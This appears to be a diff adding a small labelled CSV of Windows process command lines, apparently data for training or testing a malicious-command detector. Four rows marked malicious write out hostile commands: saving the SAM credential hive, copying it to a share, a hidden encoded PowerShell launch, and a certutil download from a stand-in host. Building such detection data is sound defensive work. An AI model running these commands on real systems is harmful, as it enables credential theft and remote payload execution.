@@ -1,0 +1,11 @@
+process_name,command_line,label
+cmd.exe,whoami,benign
+cmd.exe,ipconfig /all,benign
+powershell.exe,Get-ChildItem C:\Users,benign
+reg.exe,reg save HKLM\SAM C:\Windows\Temp\sam.save,malicious
+powershell.exe,powershell -nop -w hidden -enc SQBFAFgA,malicious
+cmd.exe,net user,benign
+cmd.exe,systeminfo,benign
+certutil.exe,certutil -urlcache -f http://evil/x.exe x.exe,malicious
+cmd.exe,copy C:\Windows\Temp\sam.save \\share\out,malicious
+python3,python3 train_model.py,benign
